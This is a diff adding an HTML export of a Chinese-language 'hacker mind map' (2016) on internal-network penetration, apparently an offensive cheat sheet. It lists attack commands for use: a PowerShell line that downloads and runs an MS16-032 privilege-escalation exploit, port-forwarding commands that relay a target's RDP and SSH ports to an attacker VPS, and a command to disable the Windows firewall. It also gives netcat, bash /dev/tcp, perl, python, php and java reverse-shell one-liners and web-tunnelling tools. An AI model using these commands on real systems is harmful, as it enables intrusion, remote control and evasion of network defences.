@@ -1,0 +1,2952 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>&#40657;&#23458;&#33041;&#22270;1.0 &nbsp;&nbsp;&nbsp;2016/09/24 &nbsp;&nbsp;&nbsp;&nbsp;by @ruo</title>
+<style type="text/css">
+    li { list-style: none;  margin: 0; }
+    p { margin: 0; }
+    span.foldopened { color: white; font-size: xx-small;
+    border-width: 1; font-family: monospace; padding: 0em 0.25em 0em 0.25em; background: #e0e0e0;
+    VISIBILITY: visible;
+    cursor:pointer; }
+
+
+    span.foldclosed { color: #666666; font-size: xx-small;
+    border-width: 1; font-family: monospace; padding: 0em 0.25em 0em 0.25em; background: #e0e0e0;
+    VISIBILITY: hidden;
+    cursor:pointer; }
+
+    span.foldspecial { color: #666666; font-size: xx-small; border-style: none solid solid none;
+    border-color: #CCCCCC; border-width: 1; font-family: sans-serif; padding: 0em 0.1em 0em 0.1em; background: #e0e0e0;
+    cursor:pointer; }
+
+    span.l { color: red; font-weight: bold; }
+
+    a.mapnode:link {text-decoration: none; color: black; }
+    a.mapnode:visited {text-decoration: none; color: black; }
+    a.mapnode:active {text-decoration: none; color: black; }
+    a.mapnode:hover {text-decoration: none; color: black; background: #eeeee0; }
+
+</style>
+<!-- ^ Position is not set to relative / absolute here because of Mozilla -->
+</head>
+<body>
+
+<script type="text/javascript">
+   // Here we implement folding. It works fine with MSIE5.5, MSIE6.0 and
+   // Mozilla 0.9.6.
+
+   if (document.layers) {
+      //Netscape 4 specific code
+      pre = 'document.';
+      post = ''; }
+   if (document.getElementById) {
+      //Netscape 6 specific code
+      pre = 'document.getElementById("';
+      post = '").style'; }
+   if (document.all) {
+      //IE4+ specific code
+      pre = 'document.all.';
+      post = '.style'; }
+
+function layer_exists(layer) {
+   try {
+      eval(pre + layer + post);
+      return true; }
+   catch (error) {
+      return false; }}
+
+function show_layer(layer) {
+   eval(pre + layer + post).position = 'relative'; 
+   eval(pre + layer + post).visibility = 'visible'; }
+
+function hide_layer(layer) {
+   eval(pre + layer + post).visibility = 'hidden';
+   eval(pre + layer + post).position = 'absolute'; }
+
+function hide_folder(folder) {
+    hide_folding_layer(folder)
+    show_layer('show'+folder);
+
+    scrollBy(0,0); // This is a work around to make it work in Browsers (Explorer, Mozilla)
+}
+
+function show_folder(folder) {
+    // Precondition: all subfolders are folded
+
+    show_layer('hide'+folder);
+    hide_layer('show'+folder);
+    show_layer('fold'+folder);
+
+    scrollBy(0,0); // This is a work around to make it work in Browsers (Explorer, Mozilla)
+
+    var i;
+    for (i=1; layer_exists('fold'+folder+'_'+i); ++i) {
+       show_layer('show'+folder+'_'+i); }
+}
+function show_folder_completely(folder) {
+    // Precondition: all subfolders are folded
+
+    show_layer('hide'+folder);
+    hide_layer('show'+folder);
+    show_layer('fold'+folder);
+
+    scrollBy(0,0); // This is a work around to make it work in Browsers (Explorer, Mozilla)
+
+    var i;
+    for (i=1; layer_exists('fold'+folder+'_'+i); ++i) {
+       show_folder_completely(folder+'_'+i); }
+}
+
+
+
+function hide_folding_layer(folder) {
+   var i;
+   for (i=1; layer_exists('fold'+folder+'_'+i); ++i) {
+       hide_folding_layer(folder+'_'+i); }
+
+   hide_layer('hide'+folder);
+   hide_layer('show'+folder);
+   hide_layer('fold'+folder);
+
+   scrollBy(0,0); // This is a work around to make it work in Browsers (Explorer, Mozilla)
+}
+
+function fold_document() {
+   var i;
+   var folder = '1';
+   for (i=1; layer_exists('fold'+folder+'_'+i); ++i) {
+       hide_folder(folder+'_'+i); }
+}
+
+function unfold_document() {
+   var i;
+   var folder = '1';
+   for (i=1; layer_exists('fold'+folder+'_'+i); ++i) {
+       show_folder_completely(folder+'_'+i); }
+}
+
+</script>
+<SPAN class="foldspecial" onclick="fold_document()">All +</SPAN>
+<SPAN class="foldspecial" onclick="unfold_document()">All -</SPAN>
+<span style="color: #000000;font-size: 166%;font-family: SansSerif, sans-serif; ">&#xa;    <p>&#xa;      <font size="5">&#40657;&#23458;&#33041;&#22270;1.0</font>&#xa;    </p>&#xa;    <p>&#xa;      2016/09/24<br >&#xa;    </p>&#xa;    <p>&#xa;      by @ruo&#xa;    </p>&#xa;  </span>
+<ul><li><a href="../../../C:/Users/chen/Desktop/&#x5916;&#x7f51;&#x5165;&#x53e3;.mm.html" target="_blank"><span class=l>~</span>&nbsp;&#22806;&#32593;&#20837;&#21475;
+</a>
+
+</li>
+<li><span style="color: #0033ff;font-size: 150%;font-family: SansSerif, sans-serif; ">&#20869;&#32593;&#28183;&#36879;</span>
+<ul><li><span style="color: #00b439;font-size: 133%;font-family: SansSerif, sans-serif; ">Firewall</span>
+<ul><li><span style="color: #990000;font-size: 116%;font-family: SansSerif, sans-serif; ">&#25193;&#23637;
+<br>
+&#23547;&#25214;&#22495;&#25511;&#65288;&#24456;&#22810;&#26102;&#20505;DNS&#26381;&#21153;&#22120;&#23601;&#26159;&#22495;&#25511;&#65292;&#31649;&#29702;&#21592;&#22312;&#23433;&#35013;AD&#30340;&#26102;&#20505;&#20960;&#20046;&#37117;&#20250;&#21516;&#26102;&#22312;&#26412;&#26426;&#23433;&#35013;DNS&#26381;&#21153;&#65289;</span>
+<ul><li><span style="color: #111111;">DMZ&#65288;demilitarized zone&#65289;
+<br>
+
+<br>
+</span>
+<ul><li><span style="color: #111111;">&#25552;&#26435;&#65288;&#22312;&#25235;&#21462;&#20869;&#23384;&#23494;&#30721;&#25110;&#20854;&#20182;&#25805;&#20316;&#26435;&#38480;&#19981;&#36798;&#26631;&#30340;&#26102;&#20505;&#65289;
+<br>
+&#26159;&#21542;&#26377;&#24517;&#35201;&#25552;&#26435;&#65311;&#24456;&#22810;&#26102;&#20505;&#25105;&#20204;&#21482;&#38656;&#35201;&#30446;&#26631;&#27814;&#38519;&#31995;&#32479;&#20316;&#20026;&#20869;&#32593;&#36339;&#26495;&#65292;&#24403;&#28982;&#36824;&#26377;&#20320;&#25552;&#65288;&#26435;&#65289;&#19981;&#19979;&#26469;&#30340;&#26102;&#20505;</span>
+<ul><li><span style="color: #111111;">&#24050;&#30693;&#28431;&#27934;</span>
+<ul><li><p><span style="color: #111111;">MS16-032
+<br>
+powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/master/Invoke-MS16-032.ps1'); Invoke-MS16-032</span>
+</li>
+</ul>
+</li>
+<li><span style="color: #111111;">0day</span>
+<ul><li><span style="color: #111111;">CVE-2016-6662&#19982;CVE-2016-6663
+<br>
+MySQL &lt;= 5.7.15 &#36828;&#31243;&#20195;&#30721;&#25191;&#34892;/ &#25552;&#26435;&nbsp;(0day)</span>
+
+</li>
+
+</ul>
+</li>
+<li>RDPInception&#21453;&#26432;
+
+</li>
+
+</ul>
+</li>
+<li><span style="color: #111111;">&#32469;&#36807;&#38450;&#28779;&#22681;</span>
+<ul><li><span style="color: #111111;">&#31471;&#21475;&#36716;&#21457;</span>
+<ul><li><span id="show1_1" class="foldclosed" onClick="show_folder('1_1')" style="POSITION: absolute">+</span> <span id="hide1_1" class="foldopened" onClick="hide_folder('1_1')">-</span>
+<span style="color: #111111;">lcx</span>
+<ul id="fold1_1" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">&#26080;&#20154;&#19981;&#26195;&#30340;&#31471;&#21475;&#36716;&#21457;&#24037;&#20855;
+<br>
+&#21453;&#24377;&#27169;&#24335;&#65288;&#21453;&#24377;&#30446;&#26631;3389&#65289;&#65292;listen&#20808;&#30417;&#21548;&#26412;&#22320;80&#31471;&#21475;&#65292;-slave&#23458;&#25143;&#31471;&#20256;&#36755;&#26412;&#22320;3389&#31471;&#21475;&#21040;vps 80&#31471;&#21475;
+<br>
+on vps&#65306;lcx -listen 80 51
+<br>
+in target&#65306;lcx -slave &nbsp;vps &nbsp;80 &nbsp;127.0.0.1 3389 
+<br>
+&#20351;&#29992;&#65306;mstsc /console /v:127.0.0.1:51
+<br>
+&#20256;&#36755;&#27169;&#24335;&#65292;&#23558;&#35775;&#38382;&#26412;&#26426;8080&#37325;&#23450;&#21521;&#21040;192.168.1.9&#30340;22&#31471;&#21475;
+<br>
+in target&#65306; lcx -tran &nbsp;8080 192.168.1.9 22
+<br>
+http://www.cnblogs.com/hiccup/p/4421114.html</span>
+</li>
+</ul>
+</li>
+<li><span id="show1_2" class="foldclosed" onClick="show_folder('1_2')" style="POSITION: absolute">+</span> <span id="hide1_2" class="foldopened" onClick="hide_folder('1_2')">-</span>
+<span style="color: #111111;">firecat</span>
+<ul id="fold1_2" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">&#23558;&#20869;&#32593;192.168.1.9 22&#31471;&#21475;&#21453;&#24377;&#21040;vps 80&#31471;&#21475;
+<br>
+on vps&#65306;firecat.exe -m 0 -t 80 -s 51
+<br>
+in target&#65306;firecat-win32.exe -m 1 -h vps -t 80 -H 192.168.1.9 -s 22
+<br>
+&#20351;&#29992;&#65306;ssh -p 51 root@127.0.0.1
+<br>
+&#21453;&#24377;&#30446;&#26631;&#26426;shell
+<br>
+firecat-win32.exe -m 1 -h vps -t 80 -H 127.0.0.1 -e
+<br>
+&#20351;&#29992;&#65306;telnet 127.0.0.1 51
+<br>
+&#19981;&#25903;&#25345;&#31471;&#21475;&#36879;&#26126;&#36716;&#21457;
+<br>
+-e &#21442;&#25968;&#21487;&#20197;&#35753;&#20320;&#33719;&#24471;&#19968;&#20010;&#22238;&#36830;shell&#65292;&#24320;&#28304;&#20195;&#30721;
+<br>
+https://www.bishopfox.com/resources/tools/other-free-tools/firecat/
+<br>
+https://github.com/ru0/firecat2&#65288;&#21435;&#38500;shell&#21151;&#33021;&#65289;</span>
+</li>
+</ul>
+</li>
+<li>socat
+
+</li>
+<li><span id="show1_3" class="foldclosed" onClick="show_folder('1_3')" style="POSITION: absolute">+</span> <span id="hide1_3" class="foldopened" onClick="hide_folder('1_3')">-</span>
+<span style="color: #111111;">Fpipe</span>
+<ul id="fold1_3" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">&#21487;&#20197;&#33258;&#23450;&#20041;&#30340;-s&#28304;&#31471;&#21475;&#21442;&#25968;&#35753;&#20320;&#36731;&#26494;bypass firewall 
+<br>
+&#23558;&#36830;&#25509;&#21040;&#26412;&#22320;53&#31471;&#21475;&#30340;&#25968;&#25454;&#36716;&#21457;&#21040;192.168.1.9&#30340;22&#31471;&#21475;&#65288;-s &#25351;&#23450;&#20986;&#31449;&#28304;&#31471;&#21475;&#65289;
+<br>
+in target&#65306;fpipe -l 53 -s 23 -r 22 192.168.1.9
+<br>
+http://www.mcafee.com/us/downloads/free-tools/fpipe.aspx</span>
+</li>
+</ul>
+</li>
+<li><span id="show1_4" class="foldclosed" onClick="show_folder('1_4')" style="POSITION: absolute">+</span> <span id="hide1_4" class="foldopened" onClick="hide_folder('1_4')">-</span>
+<span style="color: #111111;">rtcp.py</span>
+<ul id="fold1_4" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">&#30693;&#36947;&#21019;&#23431;&#20986;&#29256;&#65288;Python&#29256;&#65289;
+<br>
+https://github.com/knownsec/rtcp</span>
+
+</li>
+
+</ul>
+</li>
+<li><span id="show1_5" class="foldclosed" onClick="show_folder('1_5')" style="POSITION: absolute">+</span> <span id="hide1_5" class="foldopened" onClick="hide_folder('1_5')">-</span>
+<span style="color: #111111;">&#31995;&#32479;&#21629;&#20196;netsh</span>
+<ul id="fold1_5" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">&#26174;&#31034;&#24110;&#21161; netsh interface portproxy add ?
+<br>
+Usage:
+<br>
+&#23558;8080&#31471;&#21475;&#37325;&#23450;&#21521;&#21040;192.168.1.9 &#30340;22&#31471;&#21475;
+<br>
+netsh interface portproxy add v4tov4 8080 192.168.1.9 22 127.0.0.1
+<br>
+&#26597;&#35810; netsh interface &nbsp;portproxy show &nbsp;all
+<br>
+&#20390;&#21548; ipv4: &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#36830;&#25509;&#21040;&nbsp;ipv4:
+<br>
+&#22320;&#22336; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#31471;&#21475;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#22320;&#22336;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#31471;&#21475;
+<br>
+--------------- ---------- &nbsp;--------------- ----------
+<br>
+127.0.0.1 &nbsp;&nbsp;&nbsp;8080 &nbsp;&nbsp;&nbsp;&nbsp;192.168.1.9 22
+<br>
+&#21024;&#38500; netsh interface &nbsp;portproxy delete &nbsp;
+<br>
+&#37325;&#32622; netsh interface &nbsp;portproxy reset</span>
+</li>
+</ul>
+</li>
+<li><span id="show1_6" class="foldclosed" onClick="show_folder('1_6')" style="POSITION: absolute">+</span> <span id="hide1_6" class="foldopened" onClick="hide_folder('1_6')">-</span>
+<span style="color: #111111;">nc</span>
+<ul id="fold1_6" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">Netcat
+<br>
+vps&#30417;&#21548;8080&#31471;&#21475;
+<br>
+nc -lLp 8080 [ -e /bin/sh ]
+<br>
+&#21453;&#21521;shell
+<br>
+nc -e /bin/bash | cmd.exe vps 8080
+<br>
+&#31471;&#21475;&#25195;&#25551;
+<br>
+nc -vnz -w 1 192.168.1.2 1-1000
+<br>
+https://www.joncraton.org/blog/46/netcat-for-windows/</span>
+</li>
+</ul>
+</li>
+
+</ul>
+</li>
+<li><span style="color: #111111;">Socks&#20195;&#29702;</span>
+<ul><li><span style="color: #111111;">&#24120;&#29992;&#24037;&#20855;</span>
+<ul><li><span id="show1_7" class="foldclosed" onClick="show_folder('1_7')" style="POSITION: absolute">+</span> <span id="hide1_7" class="foldopened" onClick="hide_folder('1_7')">-</span>
+<span style="color: #111111;">ssh</span>
+<ul id="fold1_7" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">OpenSSH
+<br>
+&#20869;&#32593;Linux&#26080;&#30165;&#36716;&#21457;&#24517;&#22791;&#31070;&#22120;&#65292;&#27809;&#26377;&#20043;&#19968;
+<br>
+Socks&#20195;&#29702; (&#25968;&#25454;&#32463;&#36807;vps&#27969;&#20986;&#65292;&#36828;&#31471;w&#30475;&#19981;&#21040;&#30331;&#38470;)
+<br>
+ssh -qTfnN -D 1080 root@vps
+<br>
+plink -N Username@sshServer -pw Password -D 127.0.0.1:1080
+<br>
+&#31471;&#21475;&#36716;&#21457; (&#23558;&#35775;&#26412;&#22320;51&#31471;&#21475;&#25968;&#25454;&#36890;&#36807;vps&#36716;&#21457;&#21040;&#20869;&#32593;192.168.1.9&#30340;22&#31471;&#21475; )
+<br>
+ssh -CfNg -L 51:192.168.1.9:22 root@vps
+<br>
+&#21453;&#24377;&#65288;&#30417;&#21548;vps 0.0.0.0:80&#31471;&#21475;&#65292;&#36890;&#36807;&#35775;&#38382;vps 80&#31471;&#21475;&#35775;&#38382;&#21040;&#26412;&#22320;8080&#31471;&#21475;,&#38567;&#36947;&#26159;&#21452;&#21521;&#30340;&#65289;
+<br>
+ssh -CfNg -R 0.0.0.0:80:127.0.0.1:8080 root@vps
+<br>
+tips:
+<br>
+&#20462;&#25913;sshd&#21442;&#25968;&#25165;&#33021;&#32465;&#23450;&#21040;0.0.0.0
+<br>
+/etc/ssh/sshd_config
+<br>
+GatewayPorts yes
+<br>
+https://github.com/PowerShell/Win32-OpenSSH</span>
+</li>
+</ul>
+</li>
+<li><span id="show1_8" class="foldclosed" onClick="show_folder('1_8')" style="POSITION: absolute">+</span> <span id="hide1_8" class="foldopened" onClick="hide_folder('1_8')">-</span>
+<span style="color: #111111;">htran</span>
+<ul id="fold1_8" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">Talk is cheap. Show me the code.
+<br>
+&#25903;&#25345;&#31471;&#21475;&#36716;&#21457;&#65292;socks&#20195;&#29702;
+<br>
+&#21453;&#24377;&#30446;&#26631;3389
+<br>
+HTran.exe &#8211;p &#8211;listen 80 51
+<br>
+Htran.exe -p -slave vps 80 127.0.0.1 3389
+<br>
+http://blog.csdn.net/zhangjun03402/article/details/6426142</span>
+</li>
+</ul>
+</li>
+<li><span id="show1_9" class="foldclosed" onClick="show_folder('1_9')" style="POSITION: absolute">+</span> <span id="hide1_9" class="foldopened" onClick="hide_folder('1_9')">-</span>
+<span style="color: #111111;">vIDC</span>
+<ul id="fold1_9" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">vIDC2.0&#26159;&#19968;&#20010;&#31471;&#21475;&#26144;&#23556;&#24037;&#20855;
+<br>
+1&#65292;&#20195;&#29702;&#26381;&#21153;&#21151;&#33021;&#65292;&#25903;&#25345;http/socks4/socks5&#20195;&#29702;&#65292;&#25903;&#25345;&#20195;&#29702;&#39564;&#35777;&#65292;&#25903;&#25345;udp&#20195;&#29702;&#65292;&#25903;&#25345;&#20108;&#32423;&#20195;&#29702;
+<br>
+2&#65292;&#26412;&#22320;&#31471;&#21475;&#26144;&#23556;
+<br>
+3&#65292;&#31471;&#21475;&#26144;&#23556;vIDC&#21151;&#33021;
+<br>
+4&#65292;&#25903;&#25345;&#29992;&#25143;&#36828;&#31243;&#37197;&#32622;&#31649;&#29702;
+<br>
+http://www.xfocus.net/tools/200504/vIDC20.rar</span>
+</li>
+</ul>
+</li>
+<li><span id="show1_10" class="foldclosed" onClick="show_folder('1_10')" style="POSITION: absolute">+</span> <span id="hide1_10" class="foldopened" onClick="hide_folder('1_10')">-</span>
+<span style="color: #111111;">sSocks</span>
+<ul id="fold1_10" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">sSocks &#22871;&#20214;&#65288;nsocks&#65292;ssocksd &#65292;ssocks&#65292;rcsocks&#65289;
+<br>
+&#25903;&#25345;Linux&#65292;Windows&#19979;&#19981;&#25903;&#25345;&#23433;&#35013;&#25104;&#26381;&#21153;
+<br>
+&#27491;&#21521;&#20195;&#29702;&#65288;&#40664;&#35748;&#30417;&#21548;1080&#31471;&#21475;&#65289;
+<br>
+ssocksd.exe
+<br>
+&#23458;&#25143;&#31471;&#65288;&#40664;&#35748;&#30417;&#21548;1080&#31471;&#21475;&#24182;&#36716;&#21457;&#21040;1088&#31471;&#21475;&#65289;
+<br>
+rcsocks.exe
+<br>
+&#26381;&#21153;&#31471;&#65288;&#20027;&#21160;&#36830;&#25509;&#23458;&#25143;&#31471;1080&#31471;&#21475;&#65289;
+<br>
+rssocks.exe --socks rcsocksserv:1080 -b
+<br>
+&#24320;&#28304;&#20195;&#30721;
+<br>
+https://sourceforge.net/projects/ssocks/</span>
+</li>
+</ul>
+</li>
+
+</ul>
+</li>
+<li><span style="color: #111111;">&#36741;&#21161;&#24037;&#20855;</span>
+<ul><li><span id="show1_11" class="foldclosed" onClick="show_folder('1_11')" style="POSITION: absolute">+</span> <span id="hide1_11" class="foldopened" onClick="hide_folder('1_11')">-</span>
+<span style="color: #111111;">ProxyCap</span>
+<ul id="fold1_11" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">ProxyCap&#26159;&#19968;&#27454;&#21151;&#33021;&#26131;&#29992;&#30340;&#20195;&#29702;&#20849;&#20139;&#24037;&#20855;,&#31243;&#24207;&#33021;&#35753;&#20320;&#25152;&#26377;&#30340;&#24212;&#29992;&#31243;&#24207;&#36890;&#36807;HTTP&#12289;SOCKS4&#12289;SOCKS5&#20195;&#29702;&#26381;&#21153;&#22120;,&#24182;&#21487;&#20197;&#20801;&#35768;&#20320;&#25351;&#23450;&#26576;&#20010;&#24212;&#29992;&#31243;&#24207;&#20351;&#29992;&#26576;&#20010;&#20195;&#29702;&#12290;</span>
+
+</li>
+
+</ul>
+</li>
+<li><span id="show1_12" class="foldclosed" onClick="show_folder('1_12')" style="POSITION: absolute">+</span> <span id="hide1_12" class="foldopened" onClick="hide_folder('1_12')">-</span>
+<span style="color: #111111;">Proxifier</span>
+<ul id="fold1_12" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">The most advanced proxy client
+<br>
+&#25105;&#26368;&#21916;&#27426;&#30340;&#20195;&#29702;&#24037;&#20855;&#65292;&#27809;&#26377;&#20043;&#19968;
+<br>
+Proxifier allows network applications that do not support working through proxy servers to operate through a SOCKS or HTTPS proxy and chains.
+<br>
+http://www.proxifier.com/</span>
+</li>
+</ul>
+</li>
+<li><span id="show1_13" class="foldclosed" onClick="show_folder('1_13')" style="POSITION: absolute">+</span> <span id="hide1_13" class="foldopened" onClick="hide_folder('1_13')">-</span>
+<span style="color: #111111;">proxychains</span>
+<ul id="fold1_13" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">ProxyChains-NG ver 4.11
+<br>
+&#19968;&#27454;Linux&#19979;SOCKS4a/5&#65292;HTTP &#20195;&#29702;&#31243;&#24207;&#12290;&#20165;&#25903;&#25345;TCP&#21327;&#35758;&#65292;&#19981;&#33021;&#29992;nmap&#36890;&#36807;&#20854;&#20195;&#29702;&#25195;&#25551;&#23384;&#27963;&#20027;&#26426;&#12290;
+<br>
+Usage Example:
+<br>
+$ proxychains -f /etc/proxychains-other.conf telnet targethost2.com
+<br>
+https://github.com/rofl0r/proxychains-ng</span>
+</li>
+</ul>
+</li>
+<li><span style="color: #111111;">iptables</span>
+
+</li>
+
+</ul>
+</li>
+
+</ul>
+</li>
+<li><span id="show1_14" class="foldclosed" onClick="show_folder('1_14')" style="POSITION: absolute">+</span> <span id="hide1_14" class="foldopened" onClick="hide_folder('1_14')">-</span>
+<span style="color: #111111;">Web&#20195;&#29702;</span>
+<ul id="fold1_14" style="POSITION: relative; VISIBILITY: visible;"><li><span id="show1_14_1" class="foldclosed" onClick="show_folder('1_14_1')" style="POSITION: absolute">+</span> <span id="hide1_14_1" class="foldopened" onClick="hide_folder('1_14_1')">-</span>
+<span style="color: #111111;">Tunna</span>
+<ul id="fold1_14_1" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">Tunnels TCP connections over HTTP &#65288;Web&#20195;&#29702;&#65289;
+<br>
+&#19981;&#20165;&#21487;&#20197;&#20316;&#20026;socks&#20195;&#29702;&#65292;-r -a&#21442;&#25968;&#36824;&#33021;&#29992;&#20316;&#31471;&#21475;&#36716;&#21457;
+<br>
+Usage:python proxy.py -u &lt;remoteurl&gt; -l 8000
+<br>
+&#22312;&#31471;&#21475; 8000&#19978;&#21551;&#21160;&#19968;&#20010;SOCKS4a&#20195;&#29702;&#26381;&#21153;
+<br>
+https://www.secforce.com/blog/2014/11/tunna-v1-1a-socks/</span>
+</li>
+</ul>
+</li>
+<li><span id="show1_14_2" class="foldclosed" onClick="show_folder('1_14_2')" style="POSITION: absolute">+</span> <span id="hide1_14_2" class="foldopened" onClick="hide_folder('1_14_2')">-</span>
+<span style="color: #111111;">reGeorg</span>
+<ul id="fold1_14_2" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">SocksProxy&#24037;&#20855;&#65288;Web&#20195;&#29702;&#65289;
+<br>
+&#20195;&#29702;&#36895;&#24230;&#24555;&#65292;&#31283;&#23450;&#24615;&#39640;
+<br>
+&#22312;&#31471;&#21475;1080&#19978;&#21551;&#21160;socks&#20195;&#29702;
+<br>
+Usage:python reGeorgSocksProxy.py -p 1080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
+<br>
+https://github.com/sensepost/reGeorg</span>
+</li>
+</ul>
+</li>
+<li><span id="show1_14_3" class="foldclosed" onClick="show_folder('1_14_3')" style="POSITION: absolute">+</span> <span id="hide1_14_3" class="foldopened" onClick="hide_folder('1_14_3')">-</span>
+<span style="color: #111111;">reDuh</span>
+<ul id="fold1_14_3" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">ReDuh was released as part of SensePost's BlackHat USA 2008 talk on tunnelling data in and out of networks. 
+<br>
+&#20272;&#35745;&#36825;&#26159;&#26368;&#26089;&#30340;HTTP tunnels&#65292;&#25928;&#26524;&#24046;&#24378;&#20154;&#24847;
+<br>
+https://github.com/sensepost/reDuh</span>
+</li>
+</ul>
+</li>
+
+</ul>
+</li>
+<li><span id="show1_15" class="foldclosed" onClick="show_folder('1_15')" style="POSITION: absolute">+</span> <span id="hide1_15" class="foldopened" onClick="hide_folder('1_15')">-</span>
+<span style="color: #111111;">&#30452;&#25509;&#20462;&#25913;&#38450;&#28779;&#22681;&#31574;&#30053;</span>
+<ul id="fold1_15" style="POSITION: relative; VISIBILITY: visible;"><li><span id="show1_15_1" class="foldclosed" onClick="show_folder('1_15_1')" style="POSITION: absolute">+</span> <span id="hide1_15_1" class="foldopened" onClick="hide_folder('1_15_1')">-</span>
+<span style="color: #111111;">Windows&#38450;&#28779;&#22681;</span>
+<ul id="fold1_15_1" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">&#26597;&#30475;&#29366;&#24577;
+<br>
+netsh firewall show state
+<br>
+Operational mode &nbsp;= Disable
+<br>
+&#21551;&#29992;&#31105;&#29992;&#38450;&#28779;&#22681;&#160;&#160;
+<br>
+netsh&#160;firewall&#160;set&#160;opmode&#160;ENABLE | DISABLE
+<br>
+&#23548;&#20986;&#31574;&#30053;
+<br>
+reg export hklm\system\currentcontrolset\services\sharedaccess\parameters\firewallpolicy\standardprofile fw.reg</span>
+</li>
+</ul>
+</li>
+<li><span style="color: #111111;">&#20854;&#20182;&#38450;&#28779;&#22681;</span>
+
+</li>
+
+</ul>
+</li>
+
+</ul>
+</li>
+<li>&#21453;&#24377;SHELL
+<ul><li><span id="show1_16" class="foldclosed" onClick="show_folder('1_16')" style="POSITION: absolute">+</span> <span id="hide1_16" class="foldopened" onClick="hide_folder('1_16')">-</span>
+bash
+<ul id="fold1_16" style="POSITION: relative; VISIBILITY: visible;"><li>bash -i &gt;&amp; /dev/tcp/192.168.6.1/443 0&gt;&amp;1 
+
+</li>
+
+</ul>
+</li>
+<li><span id="show1_17" class="foldclosed" onClick="show_folder('1_17')" style="POSITION: absolute">+</span> <span id="hide1_17" class="foldopened" onClick="hide_folder('1_17')">-</span>
+perl
+<ul id="fold1_17" style="POSITION: relative; VISIBILITY: visible;"><li><p>perl -e 'use Socket;$i="192.168.6.1";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
+</li>
+</ul>
+</li>
+<li><span id="show1_18" class="foldclosed" onClick="show_folder('1_18')" style="POSITION: absolute">+</span> <span id="hide1_18" class="foldopened" onClick="hide_folder('1_18')">-</span>
+python
+<ul id="fold1_18" style="POSITION: relative; VISIBILITY: visible;"><li><p>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.6.1",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+</li>
+</ul>
+</li>
+<li><span id="show1_19" class="foldclosed" onClick="show_folder('1_19')" style="POSITION: absolute">+</span> <span id="hide1_19" class="foldopened" onClick="hide_folder('1_19')">-</span>
+php
+<ul id="fold1_19" style="POSITION: relative; VISIBILITY: visible;"><li>php -r '$sock=fsockopen("192.168.6.1",443);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");' 
+
+</li>
+
+</ul>
+</li>
+<li><span id="show1_20" class="foldclosed" onClick="show_folder('1_20')" style="POSITION: absolute">+</span> <span id="hide1_20" class="foldopened" onClick="hide_folder('1_20')">-</span>
+java
+<ul id="fold1_20" style="POSITION: relative; VISIBILITY: visible;"><li><p>r = Runtime.getRuntime() 2 p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/192.168.6.1/443;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[]) 3 p.waitFor() 
+</li>
+</ul>
+</li>
+<li>msf
+
+</li>
+
+</ul>
+</li>
+<li><span id="show1_21" class="foldclosed" onClick="show_folder('1_21')" style="POSITION: absolute">+</span> <span id="hide1_21" class="foldopened" onClick="hide_folder('1_21')">-</span>
+<span style="color: #111111;">&#25991;&#20214;&#19978;&#20256;&#19979;&#36733;
+<br>
+tips&#65306;&#39318;&#20808;&#27979;&#35797;http&#33021;&#19981;&#33021;&#20986;&#26469;&#65292;&#20877;&#27979;&#35797;dns&#65292;&#25511;&#21046;&#31243;&#24207;&#21487;&#20197;&#22312;&#22806;&#32593;&#20837;&#21475;&#20570;&#31471;&#21475;&#36716;&#21457;</span>
+<ul id="fold1_21" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">Webshell</span>
+
+</li>
+<li><span id="show1_21_1" class="foldclosed" onClick="show_folder('1_21_1')" style="POSITION: absolute">+</span> <span id="hide1_21_1" class="foldopened" onClick="hide_folder('1_21_1')">-</span>
+bitsadmin
+<ul id="fold1_21_1" style="POSITION: relative; VISIBILITY: visible;"><li>bitsadmin /transfer job1 http://download.sysinternals.com/files/PSTools.zip PSTools.zip 
+
+</li>
+
+</ul>
+</li>
